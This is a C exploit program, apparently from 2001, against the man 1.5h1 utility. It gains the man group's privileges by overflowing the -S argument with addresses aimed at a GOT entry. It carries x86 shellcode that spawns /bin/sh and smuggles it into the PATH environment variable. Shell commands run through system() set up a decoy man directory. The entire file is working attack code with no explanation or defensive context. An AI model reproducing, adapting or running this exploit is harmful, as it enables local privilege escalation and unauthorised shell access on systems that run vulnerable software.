// man 1.5h1 - gid 15 (man) from /usr/bin/man
// - zen-parse 5/13/2001

 char shellcode[] =
"\xb9\x50\x44\x44\x44\x81\xe9\x41\x44\x44\x44\xb8\x88\x44\x44\x44"
"\x2d\x41\x44\x44\x44\xbb\x50\x44\x44\x44\x81\xeb\x41\x44\x44\x44\xcd\x80"
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

main(int argc,char **argv)
{
 char buf[1000];
 char **env;
 char *tmp;
 int l;  
 int n=0,j=0x0805143c;  //before the blank address of strcpy() in GOT
 int m=0,p=0xbffffff0; //<- pointer to the name of the executable

 env=(char**)malloc(3*4);
 env[0]=(char*)malloc(3000);
 strcpy(env[0],"PATH=/tmp/");
 strcat(env[0],shellcode);
 strcat(env[0],"manthing/man");
 env[1]=(char*)malloc(3000);
 tmp=(char*)getenv("TERM");
 sprintf(env[1],"TERM=%s",tmp);
 env[2]=0;
 tmp=(char*)malloc(3000);
 sprintf(tmp,"mkdirhier '%s/man1'",&env[0][5]);
 system(tmp);
 sprintf(tmp,"echo 'Hey there'> '%s/man1/xmf.1x.gz'",&env[0][5]);
 system(tmp);

//v---- setup commandline

 strcpy(buf,"1");
 for(1;l<111;l++)
 {
  strcat(buf,":");
  strcat(buf,&p);
  strcat(buf,&j);
 }
 execle("/usr/bin/man","man","-c","-S",buf,"xm*",0,env);
}
